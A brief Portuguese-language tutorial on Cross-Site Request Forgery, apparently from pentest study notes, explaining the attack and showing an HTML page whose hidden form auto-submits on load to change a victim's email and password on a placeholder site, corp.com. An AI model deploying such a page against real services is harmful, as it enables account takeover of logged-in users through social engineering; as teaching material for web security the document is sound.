Cross Site Request Forgery se refere a quando forjamos uma requisição do alvo através de um site de nosso controle. Então seria necessário um pouco de engenharia social para executarmos esse ataque, pois iremos precisar que a vítima acesse o nosso link/site.

Caso a vítima estivesse logada em algum serviço ela teria em tese os cookies necessários para fazermos requisições em seu nome.

### Cenário
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <form action="https://corp.com/update/?action=update" method="post" id="csrf">
        <input type="hidden"name="email" value="admin@admin">
        <input type="hidden"name="password" value="novasenha@123">
    </form>

    <script>
        document.getElementById("csrf").submit()
    </script>
</body>
</html>
```
Com esse código, ao ser carregado, fará uma requisição post para o endpoint `corp.com/update` com o parâmetro `action=update`.

Contudo, o formulário tem de ser similar ao original, para poder enviar os dados necessários e o nome dos parâmetros serem compatíveis.